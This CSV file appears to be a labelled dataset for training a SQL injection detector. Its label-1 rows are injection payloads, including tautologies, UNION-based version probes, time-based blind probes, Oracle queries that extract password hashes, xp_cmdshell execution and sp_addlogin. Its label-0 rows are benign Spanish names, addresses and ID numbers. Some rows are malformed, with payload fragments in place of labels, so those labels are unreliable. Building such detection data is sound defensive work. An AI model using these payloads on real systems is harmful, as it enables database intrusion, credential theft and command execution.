Sentence,Label
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1
 or uid like '%,1
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1
23 or 1  =  1,1
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1", --
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
0 or 1  =  1,1
select * from users where id  =  1 &@ or 1  =  1 -- 1,1
"admin""  )   or ""1""  =  ""1",1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
&apos,1
sqlvuln,1
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
""" or """"*""",1
"hi or 1  =  1 --""",1
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1
,1
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
select * from information_schema.tables--, exec master..xp_cmdshell 'ping 172.10.1.255'--
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1
   (  select top 1,1
Ã½ or 1  =  1 --,1
a' --,1
 or 1  =  1 /*,1
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogin 'name' , 'password'",1
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1
group by userid having 1  =  1--,1
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1
select * from users where id  =  1 *1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
‘ or 1  =  1 --,1
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1
or 'a'  =  'a,1
declare @s varchar  (  22  )   select @s   = ,1
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1
@variable,1
,1
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1", exec master..xp_cmdshell
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1
 and 1 in   (  select var from temp  )  --,1
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1
or x  =  x,1
or a  =  a,1
or '1'  =  '1,1
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
,1
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1
a' or 1  =  1--,1
 )   or   (  a  =  a,1
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1
-- &password  = ,1
select * from users where id  =  1 <@. or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
 or '1'  =  '1,1
admin' or 1  =  1,1
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1
 or 1  =  1--,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ or 3  =  3 --,1
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1
 )   union select * from information_schema.tables,1
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
""" or """" """,1
delete,1
,1
 or 1  =  1 --,1
1' and non_existant_table   =   '1,1
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",waitfor delay '0:0:__TIME__'--
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1
x' AND userid IS NULL,1
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 union select @<@,version  (    )   -- 1", --
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1
UNION ALL SELECT,1
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1
x' or full_name like '%bob%,1
x' and members.email is NULL,1
 or 2 > 1,1
select * from users where id  =  1.*1 or 1  =  1 -- 1,1
"""  )   or pg_sleep  (  __TIME__  )  --", --
 ',1
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1
 )   or sleep  (  __TIME__  )    =  ',1
sleep 50',1
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1
or sleep  (  __TIME__  )    =  ',1
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
or 2 > 1,1
,1
-9456%'   )    )     )   order by 1#,1
99745017c,1
ejerci78, exec   (  'sel' + 'ect us' + 'er'  ) 
47209,1
"calle valencia de don juan 161, 7?d",0
b3r3al,0
46942381w,0
[email],0
24596413y,0
compte,0
2366,0
leshowit,0
lehar,0
45699398p,0
"calle profesor angel lacalle, s/n,",0
tardn,0
3.55E+15,0
14100,0
rigby,0
caada del hoyo,0
45641,0
englert,0
threader,0
elias pallares,0
f1581il2ente,0
57317186j,0
bocana$da,0
escarpelo,0
43785,0
3.40E+15,0
lu,0
"calle limones, 60,",0
hana,0
dillard,0
casas de miravete,0
olea de boedo,0
empuar,0
0o380ado6,0
montroy,0
99997973e,0
8.36E+15,0
"grupo fuensanta 197, 12?a",0
jalance,0
4.20E+14,0
"c/ ricardo gutierrez 26, 8-d",0
ivancevi,0
castil de vela,0
genaro,0
ergasto,0
"llosa de ranes, la",0
es2eri5o,0
cuenca,0
02054707w,0
21184515c,0
5.71E+15,0
41110,0
marcano giner,0
[email],0
pr3caz,0
37130,0
[email],0
[email],0
"c/ julia minguillon, 179, 7-a",0
obsequ.iosa,0
"calle carlos amel, 32, 12?h",0
kallewar,0
59760678p,0
5240,0
toperzer1,0
canaan,0
suzuki,0
"antigua de ancora s/n,",0
"calle dean miranda 106, 6-f",0
10380,0
madgett,0
gerola pugliesi,0
36574,0
"c/ comedias, 109,",0
8.62E+15,0
tanchak,0
"don quijote 81,",0
ceferina,0
saturnino,0
[email],0
5n37do,0
[email],0
micaas,0
[email],0
9.48E+15,0
5.84E+15,0
ajoy,0
irissou,0
quisto,0
s5bal850de,0
[email],0
lurlene,0
"c/ elvas 112, 13-a",0
"de canoves 13,",0
hembrick,0
1.76E+15,0
[email],0
katia,0
[email],0
3.82E+15,0
penarroya ingla,0
6.66E+15,0
"calle artigako haritza, s/n 8?d",0
kiyohara,0
iracema,0
2719,0
recabdador,0
40142,0
bernadet,0
76150645z,0
29540,0
nehemiah,0
reiji,0
"plaa gabriela mistral, 140",0
mirabel,0
sanidad,0
arriharn espinet,0
alguer murillo,0
47419,0
swearing,0
lightfie,0
epnimo,0
guillen,0
mahbeer,0
[email],0
azarshah,0
m7124v3,0
medianero,0
[email],0
amelia,0
estival,0
3.98E+15,0
"calle manco, 109, 10-g",0
vinko,0
parke antonio trueba 175,0
8.51E+15,0
9.84E+15,0
"calle la revoltosa, 55, 11c",0
"calle hostieros, 24",0
condensativo,0
44706,0
5.89E+15,0
poma gozalbo,0
40592671v,0
contreras,0
18611,0
ma724-3ra,0
olaya,0
17744,0
7118,0
19219,0
lula,0
9.84is22nte334c799,0
rub de bracamonte,0
75771832b,0
muthuswa,0
d76en3r9n8z01,0
"c/ padilla, 74 12h",0
8.85E+15,0
[email],0
es3regamiento,0
aflechate,0
63829565b,0
60613075w,0
freydig rueda,0
itrabo,0
credido poma,0
29491,0
1064,0
gula,0
de1l2nda9ur4,0
"c/ honduras, 139 7-a",0
vajih,0
salinillas de bureba,0
6267,0
c/ san ildefonso 106 10?h,0
[email],0
arraia-maeztu,0
34112,0
protoalbitar,0
pontevedra,0
savoula,0
2144,0
albeta,0
96761343k,0
lamentante,0
50159319e,0
andrs castanyer,0
[email],0
harmony,0
vlez acejas,0
enlutada,0
gabriela1,0
c/ david 169 6-h,0
methi,0
graciliano,0
61,0
4.14E+15,0
steele,0
1.44E+15,0
brockie,0
depredador,0
comalada,0
7633,0
robledo,0
37793,0
archie,0
47649,0
4a2ho4a2o,0
c/ coca de la piera 167,0
oseja,0
31410,0
1.08E+15,0
36823414t,0
ginest baquedano,0
mallo etchart,0
nanclares espejo,0
serpiginoso,0
"calle dinamarca 14,",0
72523597c,0
67242195q,0
6.05E+15,0
aricel,0
"c/ concepcion alexandre 82,",0
v5llo34,0
burg,0
4135,0
10161,0
"chorrito bajo, 11",0
8623,0
l1b6855ca30e,0
en546al,0
"c/ el breton, 187",0
koichi,0
[email],0
mieza,0
16154,0
salgado,0
16118,0
zapardiel de la ribera,0
[email],0
15994230f,0
nazareno,0
shou-che,0
24152,0
villalobn,0
cardedeu 54,0
"pl. curro cuchares, 72,",0
"romeral, el",0
10300,0
firat6,0
"calle marino cervera, 173,",0
sparky,0
strock,0
[email],0
alfredo calderon 136,0
hanzlice,0
paucides,0
6.03E+15,0
puigpunyent,0
zangn,0
chilln,0
6110,0
galindo beneyto,0
ayyuce,0
de_la,0
aventino,0
47185,0
5ecom058a?8a,0
"lugar los morros, 50, 9?c",0
[email],0
58305784w,0
9.27E+15,0
[email],0
michigan,0
igal,0
c/ hermanos pinzon 178,0
grandy,0
serneo,0
bellaguarda,0
"cuesta sagrado corazon, 155 5?a",0
[email],0
veneranda,0
torre de arcas,0
[email],0
sntoma,0
niu,0
eduviges,0
42010181z,0
minera dauns,0
8.96E+15,0
[email],0
aguinaga achutegui,0
6.91E+15,0
bradney4,0
shanir,0
34855320q,0
wun,0
[email],0
calle soria 154 2a,0
humfrey,0
1320,0
[email],0
8170,0
[email],0
[email],0
es518l132n,0
rajadell,0
ramblizo,0
d060u2ar,0
8349,0
brunton9,0
sile,0
8935,0
4.54E+15,0
1.36E+15,0
azcrate campalan,0
"calle juan sebastian elcano, 157 11?b",0
heicy,0
62,0
massimil,0
n89m3nd2,0
6.69E+14,0
kindelan,0
a79ga44,0
49540097y,0
2.75E+15,0
ibarra,0
18898337l,0
47gent1r,0
estolano boget,0
"sierra bermeja s/n,",0
jimnez algora,0
ponsati puratic,0
[email],0
28670,0
"calle joan salvat papasseit s/n,",0
28721,0
nardi borgua,0
roger,0
san miguel de abona,0
denni,0
cercs,0
d0s9pi2car,0
o$ficinesca,0
conde,0
menju,0
[email],0
88360528w,0
16856,0
pesquisar,0
subidor,0
escudero ostria,0
calle conde de cartagena 97 5f,0
3.67E+15,0
3471,0
"marines, los",0
"senda buen paso s/n,",0
5366,0
[email],0
santaren,0
mejury8,0
38355013y,0
[email],0
06673981w,0
pche,0
hervs bediaga,0
longo,0
tunaroza capmany,0
37795,0
flixmara,0
roni,0
sertino,0
"umbria, 143,",0
veri5icat1va,0
2.23E+14,0
[email],0
parolero,0
polanco,0
jackelyn,0
34310,0
9ar5i04o,0
indocto,0
[email],0
saleh,0
e72i4,0
sant andreu de la barca,0
f8av2,0
49211,0
karin,0
gu5cima,0
[email],0
69671861p,0
doriot,0
6.72E+15,0
gregonio,0
38821598j,0
katy,0
angullo acosta,0
c63en13759,0
23611263s,0
29850288z,0
cancela,0
c/ grabador david roberts 154 1-h,0
1.03E+15,0
37110,0
de tena leguizamn,0
5154,0
eddisfor4,0
4560,0
4.92E+15,0
monvar/monver,0
"pobla de segur 125,",0
23670,0
3.82E+15,0
15318,0
8121,0
41713468r,0
3.19E+15,0
"san petersburgo, 165",0
71648159p,0
4176,0
[email],0
16601924h,0
segura reygadas,0
"passeig gaudi 77, 3-e",0
llasera,0
ca5r7211a,0
16610,0
cantoria,0
[email],0
[email],0
22010612a,0
trastabilln,0
[email],0
20120,0
leonel,0
micr6pil8,0
"calle puebla de los infantes, 145",0
bscones de ojeda,0
ares,0
"marcelino suarez 39,",0
847,0
adalgisa,0
5150,0
88253687l,0
